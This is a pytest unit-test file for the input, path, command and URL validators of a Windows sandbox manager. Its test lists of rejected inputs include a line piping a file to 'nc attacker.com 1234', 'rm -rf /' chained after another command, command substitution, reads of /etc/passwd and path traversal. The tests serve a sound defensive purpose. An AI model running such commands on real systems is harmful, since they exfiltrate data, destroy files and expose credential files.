"""
Unit tests for security validation.
"""

import pytest
from pathlib import Path

from windows_sandbox_manager.security.validation import (
    InputValidator, PathValidator, CommandValidator, SecurityError
)


class TestInputValidator:
    """Test InputValidator class."""
    
    def test_validate_string_length(self):
        """Test string length validation."""
        # Valid length
        result = InputValidator.validate_string_length("test", 10)
        assert result == "test"
        
        # Too long
        with pytest.raises(SecurityError):
            InputValidator.validate_string_length("a" * 1001, 1000)
    
    def test_sanitize_string(self):
        """Test string sanitization."""
        # Normal string
        result = InputValidator.sanitize_string("hello world")
        assert result == "hello world"
        
        # String with control characters
        dirty = "hello\x00world\x01test"
        result = InputValidator.sanitize_string(dirty)
        assert result == "helloworldtest"
        
        # String with whitespace
        result = InputValidator.sanitize_string("  hello world  ")
        assert result == "hello world"
    
    def test_validate_alphanumeric(self):
        """Test alphanumeric validation."""
        # Valid alphanumeric
        result = InputValidator.validate_alphanumeric("test123")
        assert result == "test123"
        
        # Valid with spaces
        result = InputValidator.validate_alphanumeric("test 123", allow_spaces=True)
        assert result == "test 123"
        
        # Invalid characters
        with pytest.raises(SecurityError):
            InputValidator.validate_alphanumeric("test@123")
        
        # Spaces not allowed
        with pytest.raises(SecurityError):
            InputValidator.validate_alphanumeric("test 123", allow_spaces=False)
    
    def test_validate_name(self):
        """Test name validation."""
        # Valid names
        assert InputValidator.validate_name("test-sandbox") == "test-sandbox"
        assert InputValidator.validate_name("test_sandbox") == "test_sandbox"
        assert InputValidator.validate_name("  test  ") == "test"
        
        # Invalid names
        with pytest.raises(SecurityError):
            InputValidator.validate_name("")
        
        with pytest.raises(SecurityError):
            InputValidator.validate_name("   ")
        
        with pytest.raises(SecurityError):
            InputValidator.validate_name("a" * 60)
        
        with pytest.raises(SecurityError):
            InputValidator.validate_name("test@sandbox")


class TestPathValidator:
    """Test PathValidator class."""
    
    def test_validate_guest_path(self):
        """Test guest path validation."""
        # Valid absolute path
        path = PathValidator.validate_guest_path("C:/Users/test")
        assert path == Path("C:/Users/test")
        
        # Path traversal attempts
        with pytest.raises(SecurityError):
            PathValidator.validate_guest_path("C:/Users/../Windows")
        
        with pytest.raises(SecurityError):
            PathValidator.validate_guest_path("../etc/passwd")
        
        # Relative path
        with pytest.raises(SecurityError):
            PathValidator.validate_guest_path("relative/path")
    
    def test_validate_file_extension(self):
        """Test file extension validation."""
        allowed = {'.txt', '.py', '.json'}
        
        # Allowed extensions
        assert PathValidator.validate_file_extension(Path("test.txt"), allowed)
        assert PathValidator.validate_file_extension(Path("test.py"), allowed)
        
        # Not allowed
        assert not PathValidator.validate_file_extension(Path("test.exe"), allowed)
        
        # Case insensitive
        assert PathValidator.validate_file_extension(Path("test.TXT"), allowed)
        
        # Empty allowed list (allow all)
        assert PathValidator.validate_file_extension(Path("test.exe"), set())


class TestCommandValidator:
    """Test CommandValidator class."""
    
    def test_validate_command(self):
        """Test command validation."""
        # Valid commands
        result = CommandValidator.validate_command("python script.py")
        assert result == "python script.py"
        
        result = CommandValidator.validate_command("  ls -la  ")
        assert result == "ls -la"
        
        # Empty command
        with pytest.raises(SecurityError):
            CommandValidator.validate_command("")
        
        with pytest.raises(SecurityError):
            CommandValidator.validate_command("   ")
        
        # Too long
        with pytest.raises(SecurityError):
            CommandValidator.validate_command("a" * 2001)
    
    def test_dangerous_command_patterns(self):
        """Test detection of dangerous command patterns."""
        dangerous_commands = [
            "ls & rm -rf /",
            "cat file | nc attacker.com 1234",
            "echo test; rm file",
            "echo `whoami`",
            "echo $(id)",
            "cat file > /tmp/output",
            "cat < /etc/passwd",
        ]
        
        for cmd in dangerous_commands:
            with pytest.raises(SecurityError):
                CommandValidator.validate_command(cmd)
    
    def test_dangerous_base_commands(self):
        """Test detection of truly dangerous base commands."""
        # Only truly dangerous commands that could harm system even in sandbox
        dangerous_commands = [
            "format C:",
            "diskpart",
            "shutdown /s",
            "restart",
            "reboot",
        ]
        
        for cmd in dangerous_commands:
            with pytest.raises(SecurityError):
                CommandValidator.validate_command(cmd)
                
        # Commands that should be allowed in sandbox environment
        allowed_commands = [
            "cmd /c dir",
            "powershell Get-Process", 
            "python script.py",
            "dir",
            "type file.txt",
        ]
        
        for cmd in allowed_commands:
            # Should not raise an exception
            result = CommandValidator.validate_command(cmd)
            assert result == cmd
    
    def test_sanitize_argument(self):
        """Test argument sanitization."""
        # Clean argument
        result = CommandValidator.sanitize_argument("normal_arg")
        assert result == "normal_arg"
        
        # Dangerous characters
        result = CommandValidator.sanitize_argument("arg&with|dangerous;chars")
        assert result == "argwithdangerouschars"
        
        # Whitespace handling
        result = CommandValidator.sanitize_argument("  arg  ")
        assert result == "arg"
    
    def test_validate_url(self):
        """Test URL validation."""
        # Valid URLs
        result = CommandValidator.validate_url("https://example.com")
        assert result == "https://example.com"
        
        result = CommandValidator.validate_url("http://api.service.com/data")
        assert result == "http://api.service.com/data"
        
        # Invalid schemes
        with pytest.raises(SecurityError):
            CommandValidator.validate_url("ftp://example.com")
        
        with pytest.raises(SecurityError):
            CommandValidator.validate_url("file:///etc/passwd")
        
        # Local network access
        with pytest.raises(SecurityError):
            CommandValidator.validate_url("http://localhost:8080")
        
        with pytest.raises(SecurityError):
            CommandValidator.validate_url("https://127.0.0.1")
        
        with pytest.raises(SecurityError):
            CommandValidator.validate_url("http://192.168.1.1")
        
        # Invalid URL format
        with pytest.raises(SecurityError):
            CommandValidator.validate_url("not-a-url")